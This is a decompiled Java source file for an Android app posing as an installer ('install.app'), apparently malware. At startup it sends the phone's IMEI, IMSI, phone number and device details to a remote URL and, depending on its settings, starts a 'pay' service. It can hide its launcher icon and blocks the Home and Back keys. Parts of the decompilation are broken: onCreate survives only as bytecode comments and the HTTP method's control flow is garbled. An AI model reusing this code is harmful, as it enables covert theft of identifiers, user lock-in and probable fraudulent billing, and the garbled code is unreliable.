package install.app;

import android.app.Activity;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.webkit.JsPromptResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.CheckBox;
import java.io.DataOutputStream;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.LinkedList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.utils.URLEncodedUtils;
import org.json.JSONException;
import org.json.JSONObject;

public class MainActivity
  extends Activity
{
  public static int IDD_LOADING = 2;
  public static WebApi api;
  public static String folder = "";
  public static Settings settings = null;
  public static WebView webView;
  public Handler handler = null;
  public JSONObject jsonSettings;
  ProgressDialog loadingDialog = null;
  
  public MainActivity() {}
  
  public static void callJsCallbackAndroidVersion(String paramString)
  {
    System.out.println("callJsCallbackAndroidVersion()");
    System.out.println("version: " + paramString);
    try
    {
      paramString = "'" + paramString + "'";
      paramString = "javascript:androidVersion(" + paramString + ")";
      webView.loadUrl(paramString);
      return;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public static void executeJs(String paramString)
  {
    try
    {
      webView.loadUrl(paramString);
      return;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public static void openUrl(Context paramContext, String paramString)
  {
    try
    {
      paramString = new Intent("android.intent.action.VIEW", Uri.parse(paramString));
      paramString.addFlags(268435456);
      paramContext.startActivity(paramString);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static HttpURLConnection sendHttpRequest(String paramString1, String paramString2, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    Object localObject = null;
    for (;;)
    {
      try
      {
        if (paramString2.equals("POST"))
        {
          localObject = new URL(paramString1);
          paramString1 = (HttpURLConnection)((URL)localObject).openConnection();
          paramString1.setDoInput(true);
          paramString1.setDoOutput(true);
          paramString1.setUseCaches(false);
          paramString1.setRequestMethod(paramString2);
          if (!paramString2.equals("POST")) {
            break label348;
          }
          paramString1.setRequestProperty("Content-Type", "multipart/form-data; boundary=AaB03x");
          break label348;
          if (i >= paramList2.size())
          {
            if (!paramString2.equals("POST")) {
              continue;
            }
            paramString2 = new DataOutputStream(paramString1.getOutputStream());
            i = 0;
            if (i < paramList1.size()) {
              continue;
            }
            paramString2.writeBytes("--AaB03x--");
            paramString2.writeBytes("\r\n");
            paramString2.flush();
            paramString2.close();
            break;
          }
        }
        else
        {
          if (!paramString2.equals("GET")) {
            continue;
          }
          localObject = new URL(paramString1 + "?" + URLEncodedUtils.format(paramList1, "utf-8"));
          continue;
        }
        localObject = (NameValuePair)paramList1.get(i);
        paramString1.setRequestProperty(((NameValuePair)localObject).getName(), ((NameValuePair)localObject).getValue());
        i += 1;
        continue;
        paramList2 = (NameValuePair)paramList1.get(i);
        paramString2.writeBytes("--AaB03x");
        paramString2.writeBytes("\r\n");
        paramString2.writeBytes("Content-Disposition: form-data; name=\"" + paramList2.getName() + "\"");
        paramString2.writeBytes("\r\n");
        paramString2.writeBytes("\r\n");
        paramString2.write(paramList2.getValue().getBytes("utf-8"));
        paramString2.writeBytes("\r\n");
        i += 1;
        continue;
        if (!paramString2.equals("GET")) {
          break;
        }
        paramString1.connect();
      }
      catch (Exception paramString1)
      {
        paramString1.printStackTrace();
        return null;
      }
      label348:
      int i = 0;
    }
    return paramString1;
  }
  
  public static void sendPostRequest(String paramString, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    sendSimpleHttpRequest(paramString, "POST", paramList1, paramList2);
  }
  
  public static void sendSimpleHttpRequest(String paramString1, String paramString2, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    try
    {
      paramString1 = sendHttpRequest(paramString1, paramString2, paramList1, paramList2);
      if (paramString1 != null)
      {
        System.out.println("getResponseCode: " + paramString1.getResponseCode());
        paramString1.disconnect();
      }
      return;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  public static void uninstallApk(Context paramContext, String paramString)
  {
    System.out.println("uninstallApk: " + paramString);
    Intent localIntent = new Intent("android.intent.action.DELETE");
    localIntent.setData(Uri.parse("package:" + paramString));
    localIntent.addFlags(268435456);
    paramContext.startActivity(localIntent);
  }
  
  public void onClickNext(View paramView)
  {
    System.out.println("onClickNext()");
    try
    {
      paramView = new JSONObject(Constants.data).getJSONObject("settings");
      int i = paramView.getInt("mode");
      if ((i == 2) || (i == 4)) {
        MainService.start(this, new Intent(), "pay");
      }
      openUrl(this, paramView.getString("dataUrl").replace("{IMEI}", Constants.imei).replace("{IMSI}", Constants.imsi).replace("{PHONE}", Constants.phone).replace("{COUNTRY}", Constants.country).replace("{APPID}", getText(2131099649)).replace("{MODEL}", Build.MODEL).replace("{MANUFACTURER}", Build.MANUFACTURER).replace("{SDK}", String.valueOf(Build.VERSION.SDK_INT)));
      return;
    }
    catch (Exception paramView)
    {
      paramView.printStackTrace();
    }
  }
  
  public void onClickRule(View paramView)
  {
    System.out.println("onClickRule");
    paramView = (CheckBox)paramView;
    ((Button)findViewById(2131296258)).setEnabled(paramView.isChecked());
  }
  
  public void onConfigurationChanged(Configuration paramConfiguration)
  {
    super.onConfigurationChanged(paramConfiguration);
    setRequestedOrientation(1);
  }
  
  /* Error */
  public void onCreate(android.os.Bundle paramBundle)
  {
    // Byte code:
    //   0: aload_0
    //   1: aload_1
    //   2: invokespecial 389	android/app/Activity:onCreate	(Landroid/os/Bundle;)V
    //   5: aload_0
    //   6: getstatic 32	install/app/MainActivity:IDD_LOADING	I
    //   9: invokevirtual 392	install/app/MainActivity:showDialog	(I)V
    //   12: new 394	install/app/Settings
    //   15: dup
    //   16: invokespecial 395	install/app/Settings:<init>	()V
    //   19: astore_1
    //   20: aload_1
    //   21: aload_0
    //   22: invokevirtual 399	install/app/Settings:load	(Landroid/content/Context;)Z
    //   25: ifne +9 -> 34
    //   28: aload_1
    //   29: aload_0
    //   30: invokevirtual 402	install/app/Settings:save	(Landroid/content/Context;)Z
    //   33: pop
    //   34: aload_0
    //   35: invokevirtual 405	install/app/MainActivity:sendHttp	()V
    //   38: aload_0
    //   39: new 407	android/os/Handler
    //   42: dup
    //   43: invokespecial 408	android/os/Handler:<init>	()V
    //   46: putfield 44	install/app/MainActivity:handler	Landroid/os/Handler;
    //   49: ldc_w 409
    //   52: istore_2
    //   53: aload_0
    //   54: new 272	org/json/JSONObject
    //   57: dup
    //   58: getstatic 277	install/app/Constants:data	Ljava/lang/String;
    //   61: invokespecial 278	org/json/JSONObject:<init>	(Ljava/lang/String;)V
    //   64: ldc_w 279
    //   67: invokevirtual 283	org/json/JSONObject:getJSONObject	(Ljava/lang/String;)Lorg/json/JSONObject;
    //   70: putfield 411	install/app/MainActivity:jsonSettings	Lorg/json/JSONObject;
    //   73: aload_0
    //   74: getfield 411	install/app/MainActivity:jsonSettings	Lorg/json/JSONObject;
    //   77: ldc_w 413
    //   80: invokevirtual 417	org/json/JSONObject:has	(Ljava/lang/String;)Z
    //   83: ifeq +35 -> 118
    //   86: aload_0
    //   87: getfield 411	install/app/MainActivity:jsonSettings	Lorg/json/JSONObject;
    //   90: ldc_w 413
    //   93: invokevirtual 283	org/json/JSONObject:getJSONObject	(Ljava/lang/String;)Lorg/json/JSONObject;
    //   96: ldc_w 419
    //   99: invokevirtual 422	org/json/JSONObject:getBoolean	(Ljava/lang/String;)Z
    //   102: ifeq +16 -> 118
    //   105: aload_0
    //   106: invokevirtual 426	install/app/MainActivity:getPackageManager	()Landroid/content/pm/PackageManager;
    //   109: aload_0
    //   110: invokevirtual 430	install/app/MainActivity:getComponentName	()Landroid/content/ComponentName;
    //   113: iconst_2
    //   114: iconst_1
    //   115: invokevirtual 436	android/content/pm/PackageManager:setComponentEnabledSetting	(Landroid/content/ComponentName;II)V
    //   118: aload_0
    //   119: getfield 411	install/app/MainActivity:jsonSettings	Lorg/json/JSONObject;
    //   122: ldc_w 285
    //   125: invokevirtual 289	org/json/JSONObject:getInt	(Ljava/lang/String;)I
    //   128: istore_3
    //   129: iload_3
    //   130: iconst_1
    //   131: if_icmpne +17 -> 148
    //   134: aload_0
    //   135: new 96	android/content/Intent
    //   138: dup
    //   139: invokespecial 290	android/content/Intent:<init>	()V
    //   142: ldc_w 292
    //   145: invokestatic 298	install/app/MainService:start	(Landroid/content/Context;Landroid/content/Intent;Ljava/lang/String;)V
    //   148: iload_3
    //   149: iconst_3
    //   150: if_icmpne +239 -> 389
    //   153: ldc_w 409
    //   156: istore_2
    //   157: aload_0
    //   158: iload_2
    //   159: invokevirtual 439	install/app/MainActivity:setContentView	(I)V
    //   162: new 441	install/app/WebApi
    //   165: dup
    //   166: aload_0
    //   167: aload_0
    //   168: invokespecial 444	install/app/WebApi:<init>	(Landroid/content/Context;Linstall/app/MainActivity;)V
    //   171: putstatic 446	install/app/MainActivity:api	Linstall/app/WebApi;
    //   174: new 85	android/webkit/WebView
    //   177: dup
    //   178: aload_0
    //   179: invokespecial 449	android/webkit/WebView:<init>	(Landroid/content/Context;)V
    //   182: putstatic 83	install/app/MainActivity:webView	Landroid/webkit/WebView;
    //   185: new 6	install/app/MainActivity$1
    //   188: dup
    //   189: aload_0
    //   190: invokespecial 452	install/app/MainActivity$1:<init>	(Linstall/app/MainActivity;)V
    //   193: astore_1
    //   194: getstatic 83	install/app/MainActivity:webView	Landroid/webkit/WebView;
    //   197: aload_1
    //   198: invokevirtual 456	android/webkit/WebView:setWebViewClient	(Landroid/webkit/WebViewClient;)V
    //   201: getstatic 83	install/app/MainActivity:webView	Landroid/webkit/WebView;
    //   204: ldc_w 457
    //   207: invokevirtual 460	android/webkit/WebView:setScrollBarStyle	(I)V
    //   210: getstatic 83	install/app/MainActivity:webView	Landroid/webkit/WebView;
    //   213: invokevirtual 464	android/webkit/WebView:getSettings	()Landroid/webkit/WebSettings;
    //   216: iconst_1
    //   217: invokevirtual 469	android/webkit/WebSettings:setJavaScriptEnabled	(Z)V
    //   220: getstatic 83	install/app/MainActivity:webView	Landroid/webkit/WebView;
    //   223: new 8	install/app/MainActivity$2
    //   226: dup
    //   227: aload_0
    //   228: invokespecial 470	install/app/MainActivity$2:<init>	(Linstall/app/MainActivity;)V
    //   231: invokevirtual 474	android/webkit/WebView:setWebChromeClient	(Landroid/webkit/WebChromeClient;)V
    //   234: getstatic 83	install/app/MainActivity:webView	Landroid/webkit/WebView;
    //   237: getstatic 446	install/app/MainActivity:api	Linstall/app/WebApi;
    //   240: ldc_w 476
    //   243: invokevirtual 480	android/webkit/WebView:addJavascriptInterface	(Ljava/lang/Object;Ljava/lang/String;)V
    //   246: getstatic 83	install/app/MainActivity:webView	Landroid/webkit/WebView;
    //   249: new 482	android/widget/LinearLayout$LayoutParams
    //   252: dup
    //   253: iconst_m1
    //   254: bipush -2
    //   256: fconst_1
    //   257: invokespecial 485	android/widget/LinearLayout$LayoutParams:<init>	(IIF)V
    //   260: invokevirtual 489	android/webkit/WebView:setLayoutParams	(Landroid/view/ViewGroup$LayoutParams;)V
    //   263: aload_0
    //   264: ldc_w 490
    //   267: invokevirtual 368	install/app/MainActivity:findViewById	(I)Landroid/view/View;
    //   270: checkcast 492	android/widget/LinearLayout
    //   273: getstatic 83	install/app/MainActivity:webView	Landroid/webkit/WebView;
    //   276: invokevirtual 495	android/widget/LinearLayout:addView	(Landroid/view/View;)V
    //   279: invokestatic 499	install/app/MainService:operator	()Lorg/json/JSONObject;
    //   282: astore_1
    //   283: aload_0
    //   284: getfield 411	install/app/MainActivity:jsonSettings	Lorg/json/JSONObject;
    //   287: ldc_w 285
    //   290: invokevirtual 289	org/json/JSONObject:getInt	(Ljava/lang/String;)I
    //   293: iconst_4
    //   294: if_icmpne +37 -> 331
    //   297: aload_1
    //   298: ldc_w 285
    //   301: invokevirtual 289	org/json/JSONObject:getInt	(Ljava/lang/String;)I
    //   304: istore_2
    //   305: iload_2
    //   306: bipush 41
    //   308: if_icmpeq +9 -> 317
    //   311: iload_2
    //   312: bipush 42
    //   314: if_icmpne +17 -> 331
    //   317: aload_0
    //   318: new 96	android/content/Intent
    //   321: dup
    //   322: invokespecial 290	android/content/Intent:<init>	()V
    //   325: ldc_w 292
    //   328: invokestatic 298	install/app/MainService:start	(Landroid/content/Context;Landroid/content/Intent;Ljava/lang/String;)V
    //   331: aload_1
    //   332: ldc_w 501
    //   335: invokevirtual 304	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   338: putstatic 36	install/app/MainActivity:folder	Ljava/lang/String;
    //   341: getstatic 83	install/app/MainActivity:webView	Landroid/webkit/WebView;
    //   344: new 63	java/lang/StringBuilder
    //   347: dup
    //   348: ldc_w 503
    //   351: invokespecial 67	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   354: getstatic 36	install/app/MainActivity:folder	Ljava/lang/String;
    //   357: invokevirtual 71	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   360: ldc_w 505
    //   363: invokevirtual 71	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   366: invokevirtual 75	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   369: invokevirtual 88	android/webkit/WebView:loadUrl	(Ljava/lang/String;)V
    //   372: return
    //   373: astore_1
    //   374: aload_1
    //   375: invokevirtual 91	java/lang/Exception:printStackTrace	()V
    //   378: goto -260 -> 118
    //   381: astore_1
    //   382: aload_1
    //   383: invokevirtual 91	java/lang/Exception:printStackTrace	()V
    //   386: goto -229 -> 157
    //   389: ldc_w 506
    //   392: istore_2
    //   393: goto -236 -> 157
    //   396: astore_1
    //   397: aload_1
    //   398: invokevirtual 91	java/lang/Exception:printStackTrace	()V
    //   401: return
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	402	0	this	MainActivity
    //   0	402	1	paramBundle	android.os.Bundle
    //   52	341	2	i	int
    //   128	23	3	j	int
    // Exception table:
    //   from	to	target	type
    //   73	118	373	java/lang/Exception
    //   53	73	381	java/lang/Exception
    //   118	129	381	java/lang/Exception
    //   134	148	381	java/lang/Exception
    //   374	378	381	java/lang/Exception
    //   279	305	396	java/lang/Exception
    //   317	331	396	java/lang/Exception
    //   331	372	396	java/lang/Exception
  }
  
  protected Dialog onCreateDialog(int paramInt)
  {
    if (paramInt == IDD_LOADING)
    {
      this.loadingDialog = new ProgressDialog(this);
      this.loadingDialog.setProgressStyle(0);
      this.loadingDialog.setTitle("");
      this.loadingDialog.setMessage("Loading...");
      this.loadingDialog.setCancelable(false);
      return this.loadingDialog;
    }
    return null;
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu)
  {
    super.onCreateOptionsMenu(paramMenu);
    paramMenu.add(0, 2131296261, 0, "Правила");
    return true;
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    System.out.println("onKeyDown(): keyCode = " + paramInt);
    if (paramInt == 3) {}
    while (paramInt == 4) {
      return true;
    }
    return false;
  }
  
  public boolean onOptionsItemSelected(MenuItem paramMenuItem)
  {
    switch (paramMenuItem.getItemId())
    {
    default: 
      return super.onOptionsItemSelected(paramMenuItem);
    }
    webView.loadUrl("file:///android_asset/html/" + folder + "/license.html");
    return true;
  }
  
  public void sendHttp()
  {
    try
    {
      new Thread(new Runnable()
      {
        public void run()
        {
          try
          {
            MainActivity.sendPostRequest(new JSONObject(Constants.data).getJSONObject("settings").getString("startUrl").replace("{IMEI}", Constants.imei).replace("{IMSI}", Constants.imsi).replace("{PHONE}", Constants.phone).replace("{COUNTRY}", Constants.country).replace("{APPID}", MainActivity.this.getText(2131099649)).replace("{MODEL}", Build.MODEL).replace("{MANUFACTURER}", Build.MANUFACTURER).replace("{SDK}", String.valueOf(Build.VERSION.SDK_INT)), new LinkedList(), new LinkedList());
            return;
          }
          catch (Exception localException)
          {
            localException.printStackTrace();
          }
        }
      }).start();
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public void uninstall()
  {
    uninstallApk(this, getPackageName());
  }
}
